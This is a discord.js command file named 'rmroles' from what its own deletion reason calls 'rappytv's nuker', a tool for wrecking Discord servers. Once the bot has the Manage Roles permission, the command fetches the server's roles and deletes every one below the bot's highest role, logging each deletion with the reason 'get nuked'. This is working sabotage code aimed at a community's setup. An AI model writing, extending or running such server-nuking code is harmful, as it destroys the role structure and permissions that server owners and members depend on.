const { CommandInteraction, CommandInteractionOptionResolver, GuildMember, User, PermissionsBitField } = require("discord.js");

module.exports = {
    name: `rmroles`,
    options: [],

    /**
     * 
     * @param {CommandInteraction} interaction 
     * @param {CommandInteractionOptionResolver} options 
     * @param {GuildMember} member 
     * @param {User} user 
     */

    async execute(interaction, options, member, user) {
        const { me } = interaction.guild.members;
        if(!me.permissions.has(PermissionsBitField.Flags.ManageRoles)) return console.log(`[ERROR] I'm missing the permission ManageRoles (1 << 28)! [${interaction.guild.name}]`);
        const roles = await interaction.guild.roles.fetch();
        roles.forEach(async role => {
            if(role.name == `@everyone`) return;
            if(role.position >= me.roles.highest.position) return console.log(`[ROLE] Skipped ${role.name} (${role.id}): Higher or same position`);
            await role.delete(`get nuked [rappytv's nuker]`).then(() => {
                return console.log(`[ROLE] Deleted ${role.name} (${role.id})`);
            }).catch((err) => {
                return console.log(`[ROLE] Failed to delete ${role.name} (${role.id}): ${err}`);
            });
        });
    }
}